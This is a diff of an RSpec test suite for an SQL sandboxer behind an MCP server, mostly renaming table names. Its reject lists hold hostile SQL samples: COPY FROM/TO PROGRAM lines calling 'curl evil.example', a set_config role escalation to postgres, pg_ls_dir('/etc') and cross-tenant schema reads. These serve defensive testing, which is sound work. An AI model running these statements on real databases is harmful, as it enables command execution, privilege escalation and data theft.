@@ -35,44 +35,45 @@ RSpec.describe McpServer::SqlSandboxer do
 
   describe 'accepted: legitimate reporting queries (no over-rejection)' do
     [
-      'SELECT count(*) FROM analytics_fact_participations',
-      "SELECT date_trunc('month', d.date) AS m, count(*) " \
-      'FROM analytics_fact_participations f ' \
-      'JOIN analytics_dimension_dates d ON d.id = f.dimension_date_created_id GROUP BY 1',
-      'WITH p AS (SELECT * FROM analytics_fact_participations) SELECT count(*) FROM p',
-      'SELECT extract(year FROM d.date), count(*)::text, coalesce(f.likes_count, 0) ' \
-      'FROM analytics_fact_participations f JOIN analytics_dimension_dates d ON true GROUP BY 1, 2, 3',
-      'SELECT dimension_project_id, row_number() OVER (ORDER BY count(*) DESC) ' \
-      'FROM analytics_fact_participations GROUP BY 1',
-      'SELECT p.name, count(*) FROM analytics_fact_participations f ' \
-      'JOIN analytics_dimension_projects p ON p.id = f.dimension_project_id GROUP BY 1',
+      'SELECT count(*) FROM reporting_contributions',
+      "SELECT date_trunc('month', c.contributed_at) AS m, count(*) " \
+      'FROM reporting_contributions c ' \
+      'JOIN reporting_projects p ON p.id = c.project_id GROUP BY 1',
+      'WITH p AS (SELECT * FROM reporting_contributions) SELECT count(*) FROM p',
+      'SELECT extract(year FROM c.contributed_at), count(*)::text, coalesce(i.likes_count, 0) ' \
+      'FROM reporting_contributions c JOIN reporting_inputs i ON true GROUP BY 1, 2, 3',
+      'SELECT project_id, row_number() OVER (ORDER BY count(*) DESC) ' \
+      'FROM reporting_contributions GROUP BY 1',
+      'SELECT p.title, count(*) FROM reporting_contributions c ' \
+      'JOIN reporting_projects p ON p.id = c.project_id GROUP BY 1',
 
-      # Every exposed reporting table, joined.
-      'SELECT count(*) FROM analytics_fact_participations f ' \
-      'JOIN analytics_dimension_projects p ON true JOIN analytics_dimension_types t ON true ' \
-      'JOIN analytics_dimension_users u ON true JOIN analytics_dimension_dates d ON true',
+      # A wide join across exposed reporting tables.
+      'SELECT count(*) FROM reporting_contributions c ' \
+      'JOIN reporting_projects p ON true JOIN reporting_inputs i ON true ' \
+      'JOIN reporting_users u ON true JOIN reporting_sessions s ON true ' \
+      'JOIN reporting_pageviews pv ON true',
 
       # Scoped CTE shapes the scope-aware fix must keep working.
       'WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t WHERE n < 5) SELECT sum(n) FROM t',
-      'WITH a AS (WITH b AS (SELECT * FROM analytics_fact_participations) SELECT * FROM b) SELECT count(*) FROM a',
-      'WITH a AS (SELECT count(*) AS c FROM analytics_fact_participations), ' \
-      'b AS (SELECT count(*) AS c FROM analytics_dimension_users) SELECT a.c, b.c FROM a, b',
+      'WITH a AS (WITH b AS (SELECT * FROM reporting_contributions) SELECT * FROM b) SELECT count(*) FROM a',
+      'WITH a AS (SELECT count(*) AS c FROM reporting_contributions), ' \
+      'b AS (SELECT count(*) AS c FROM reporting_users) SELECT a.c, b.c FROM a, b',
 
       # LATERAL + correlated subquery (scope inherited from the outer query).
-      'SELECT f.dimension_project_id FROM analytics_fact_participations f, ' \
-      'LATERAL (SELECT count(*) FROM analytics_dimension_dates d WHERE d.id = f.dimension_date_created_id) x',
+      'SELECT c.project_id FROM reporting_contributions c, ' \
+      'LATERAL (SELECT count(*) FROM reporting_phases ph WHERE ph.id = c.phase_id) x',
 
       # Set operations over allowed tables.
-      'SELECT count(*) FROM analytics_fact_participations UNION SELECT count(*) FROM analytics_dimension_users',
+      'SELECT count(*) FROM reporting_contributions UNION SELECT count(*) FROM reporting_users',
 
       # The pg_catalog exemption exists so explicit pg_catalog qualification of an
       # *allowlisted* function still works.
-      'SELECT pg_catalog.count(*) FROM analytics_fact_participations',
+      'SELECT pg_catalog.count(*) FROM reporting_contributions',
 
       # A CTE may legitimately be named like a catalog as long as it is only ever
       # resolved to that CTE (its body reads an allowed table). The shadowing is
       # safe; only cross-scope name confusion (tested below) is not.
-      'WITH pg_user AS (SELECT * FROM analytics_fact_participations) SELECT count(*) FROM pg_user'
+      'WITH pg_user AS (SELECT * FROM reporting_contributions) SELECT count(*) FROM pg_user'
     ].each do |sql|
       it("accepts: #{sql[0, 80]}") { expect_accepted(sql) }
     end
@@ -90,7 +91,7 @@ RSpec.describe McpServer::SqlSandboxer do
       'pg_catalog.set_config(role)' =>
         ["SELECT pg_catalog.set_config('role', 'postgres', false)", /set_config.*not allowed/],
       'set_config(role) over a real view' =>
-        ["SELECT set_config('role','postgres',false) FROM analytics_fact_participations", /set_config.*not allowed/],
+        ["SELECT set_config('role','postgres',false) FROM reporting_contributions", /set_config.*not allowed/],
       'set_config(role) hidden in a CTE' =>
         ["WITH x AS (SELECT set_config('role','postgres',false) AS r) SELECT * FROM x", /set_config.*not allowed/],
       'SET_CONFIG uppercased (allowlist is case-insensitive)' =>
@@ -109,41 +110,43 @@ RSpec.describe McpServer::SqlSandboxer do
     {
       # Schema/catalog qualifier is the one cross-tenant hole layer 2 cannot close.
       'a schema-qualified table' =>
-        ['SELECT * FROM victim_city.analytics_fact_participations', /Schema-qualified table/],
+        ['SELECT * FROM victim_city.reporting_contributions', /Schema-qualified table/],
       'a catalog-qualified table' =>
-        ['SELECT * FROM db.public.analytics_fact_participations', /Schema-qualified table/],
+        ['SELECT * FROM db.public.reporting_contributions', /Schema-qualified table/],
       'schema-qualified inside a derived-table subquery' =>
         ['SELECT * FROM (SELECT * FROM victim.users) x', /Schema-qualified table/],
       'schema-qualified inside a scalar subquery' =>
         ['SELECT (SELECT count(*) FROM victim.users) AS n', /Schema-qualified table/],
       'schema-qualified inside an IN-subquery' =>
-        ['SELECT * FROM analytics_fact_participations WHERE dimension_user_id IN (SELECT id FROM victim.users)',
+        ['SELECT * FROM reporting_contributions WHERE user_id IN (SELECT id FROM victim.users)',
           /Schema-qualified table/],
       'schema-qualified inside a CTE body' =>
         ['WITH x AS (SELECT * FROM victim.users) SELECT * FROM x', /Schema-qualified table/],
       'schema-qualified inside a JOIN' =>
-        ['SELECT * FROM analytics_fact_participations f JOIN victim.users u ON u.id = f.dimension_user_id',
+        ['SELECT * FROM reporting_contributions f JOIN victim.users u ON u.id = f.user_id',
           /Schema-qualified table/],
       'schema-qualified inside a UNION branch' =>
-        ['SELECT 1 FROM analytics_fact_participations UNION SELECT 1 FROM victim.users', /Schema-qualified table/],
+        ['SELECT 1 FROM reporting_contributions UNION SELECT 1 FROM victim.users', /Schema-qualified table/],
       'schema-qualified inside a LATERAL subquery' =>
-        ['SELECT * FROM analytics_fact_participations f, LATERAL (SELECT * FROM victim.users) x',
+        ['SELECT * FROM reporting_contributions f, LATERAL (SELECT * FROM victim.users) x',
           /Schema-qualified table/],
       'schema-qualified buried in a CASE expression' =>
         ['SELECT CASE WHEN true THEN (SELECT count(*) FROM victim.users) ELSE 0 END', /Schema-qualified table/],
       'schema-qualified buried in a function argument' =>
-        ['SELECT max((SELECT id FROM victim.users)) FROM analytics_fact_participations', /Schema-qualified table/],
+        ['SELECT max((SELECT id FROM victim.users)) FROM reporting_contributions', /Schema-qualified table/],
 
-      # Plain & analytics_-lookalike tables outside the explicit allowlist.
+      # Plain tables and the legacy analytics views outside the explicit allowlist.
       'a plain non-whitelisted table' => ['SELECT * FROM users', /not queryable/],
-      'an analytics_-looking table not in the allowlist' =>
+      'a legacy analytics view that left the reporting surface' =>
+        ['SELECT * FROM analytics_fact_participations', /not queryable/],
+      'an analytics_-looking table never in the allowlist' =>
         ['SELECT * FROM analytics_fact_visits', /not queryable/],
       'a non-whitelisted table inside a JOIN' =>
-        ['SELECT * FROM analytics_fact_participations f JOIN users u ON u.id = f.dimension_user_id', /not queryable/],
+        ['SELECT * FROM reporting_contributions f JOIN users u ON u.id = f.user_id', /not queryable/],
 
       # search_path manipulation.
       'search_path change via set_config' =>
-        ["SELECT set_config('search_path','public',false) FROM analytics_fact_participations",
+        ["SELECT set_config('search_path','public',false) FROM reporting_contributions",
           /set_config.*not allowed/],
       'search_path change via SET' => ['SET search_path TO public', /top-level SELECT/],
 
@@ -197,16 +200,16 @@ RSpec.describe McpServer::SqlSandboxer do
       'DELETE inside a CTE' =>
         ['WITH x AS (DELETE FROM users RETURNING id) SELECT * FROM x', /Data-modifying/],
       'a top-level UPDATE' =>
-        ['UPDATE analytics_fact_participations SET dimension_user_id = NULL', /top-level SELECT/],
+        ['UPDATE reporting_contributions SET user_id = NULL', /top-level SELECT/],
       'a top-level MERGE' =>
-        ['MERGE INTO users u USING analytics_fact_participations f ON u.id = f.dimension_user_id ' \
+        ['MERGE INTO users u USING reporting_contributions f ON u.id = f.user_id ' \
          'WHEN MATCHED THEN DELETE', /top-level SELECT/],
 
       # SELECT INTO / CREATE TABLE AS materialise a new relation.
-      'SELECT ... INTO' => ['SELECT * INTO foo FROM analytics_fact_participations', /INTO/],
-      'SELECT ... INTO TEMP' => ['SELECT * INTO TEMP foo FROM analytics_fact_participations', /INTO/],
+      'SELECT ... INTO' => ['SELECT * INTO foo FROM reporting_contributions', /INTO/],
+      'SELECT ... INTO TEMP' => ['SELECT * INTO TEMP foo FROM reporting_contributions', /INTO/],
       'CREATE TABLE AS SELECT' =>
-        ['CREATE TABLE foo AS SELECT * FROM analytics_fact_participations', /top-level SELECT/],
+        ['CREATE TABLE foo AS SELECT * FROM reporting_contributions', /top-level SELECT/],
 
       # Sequence mutation.
       'nextval' => ["SELECT nextval('some_seq')", /nextval.*not allowed/],
@@ -220,23 +223,23 @@ RSpec.describe McpServer::SqlSandboxer do
       'pg_ls_dir as a FROM-clause function' => ["SELECT * FROM pg_ls_dir('/etc')", /pg_ls_dir.*not allowed/],
 
       # COPY, including the command-execution variants.
-      'COPY ... TO file' => ["COPY analytics_fact_participations TO '/tmp/x'", /top-level SELECT/],
+      'COPY ... TO file' => ["COPY reporting_contributions TO '/tmp/x'", /top-level SELECT/],
       'COPY ... FROM PROGRAM (RCE)' => ["COPY foo FROM PROGRAM 'curl evil.example'", /top-level SELECT/],
       'COPY ... TO PROGRAM (RCE)' => ["COPY (SELECT 1) TO PROGRAM 'curl evil.example'", /top-level SELECT/],
 
       # DDL / privilege changes.
-      'TRUNCATE' => ['TRUNCATE analytics_fact_participations', /top-level SELECT/],
-      'GRANT' => ['GRANT ALL ON analytics_fact_participations TO PUBLIC', /top-level SELECT/],
+      'TRUNCATE' => ['TRUNCATE reporting_contributions', /top-level SELECT/],
+      'GRANT' => ['GRANT ALL ON reporting_contributions TO PUBLIC', /top-level SELECT/],
       'CREATE FUNCTION' =>
         ["CREATE FUNCTION evil() RETURNS int AS 'SELECT 1' LANGUAGE sql", /top-level SELECT/],
-      'DROP TABLE' => ['DROP TABLE analytics_fact_participations', /top-level SELECT/],
-      'ALTER TABLE' => ['ALTER TABLE analytics_fact_participations ADD COLUMN x int', /top-level SELECT/],
+      'DROP TABLE' => ['DROP TABLE reporting_contributions', /top-level SELECT/],
+      'ALTER TABLE' => ['ALTER TABLE reporting_contributions ADD COLUMN x int', /top-level SELECT/],
       'REFRESH MATERIALIZED VIEW' =>
-        ['REFRESH MATERIALIZED VIEW analytics_fact_participations', /top-level SELECT/],
+        ['REFRESH MATERIALIZED VIEW reporting_contributions', /top-level SELECT/],
 
       # EXPLAIN ANALYZE *executes* its statement, so it must be rejected too.
       'EXPLAIN ANALYZE DELETE (would execute the delete)' =>
-        ['EXPLAIN ANALYZE DELETE FROM analytics_fact_participations', /top-level SELECT/],
+        ['EXPLAIN ANALYZE DELETE FROM reporting_contributions', /top-level SELECT/],
       'PREPARE' => ['PREPARE p AS SELECT 1', /top-level SELECT/],
       'DECLARE CURSOR' => ['DECLARE c CURSOR FOR SELECT 1', /top-level SELECT/],
       'VACUUM' => ['VACUUM', /top-level SELECT/]
@@ -248,11 +251,11 @@ RSpec.describe McpServer::SqlSandboxer do
   describe 'function allowlist (defence-in-depth: only pure, listed functions run)' do
     {
       'pg_sleep (resource-exhaustion / DoS)' =>
-        ['SELECT pg_sleep(10) FROM analytics_fact_participations', /pg_sleep.*not allowed/],
+        ['SELECT pg_sleep(10) FROM reporting_contributions', /pg_sleep.*not allowed/],
       'a schema-qualified function call' =>
-        ['SELECT public.evil() FROM analytics_fact_participations', /Schema-qualified function/],
+        ['SELECT public.evil() FROM reporting_contributions', /Schema-qualified function/],
       'an arbitrary unknown function' =>
-        ['SELECT make_me_a_sandwich() FROM analytics_fact_participations', /make_me_a_sandwich.*not allowed/]
+        ['SELECT make_me_a_sandwich() FROM reporting_contributions', /make_me_a_sandwich.*not allowed/]
     }.each do |label, (sql, message)|
       it("rejects #{label}") { expect_rejected(sql, message) }
     end
@@ -270,7 +273,7 @@ RSpec.describe McpServer::SqlSandboxer do
     end
 
     it 'accepts a single trailing semicolon and normalises it away' do
-      result = described_class.validate('SELECT count(*) FROM analytics_fact_participations;')
+      result = described_class.validate('SELECT count(*) FROM reporting_contributions;')
 
       expect(result).to be_valid
       expect(result.normalized_sql).not_to include(';')
@@ -278,7 +281,7 @@ RSpec.describe McpServer::SqlSandboxer do
 
     it 'strips comments out of the normalised SQL handed to layer 2' do
       result = described_class.validate(
-        'SELECT count(*) /* injected */ FROM analytics_fact_participations -- trailing'
+        'SELECT count(*) /* injected */ FROM reporting_contributions -- trailing'
       )
 
       expect(result).to be_valid
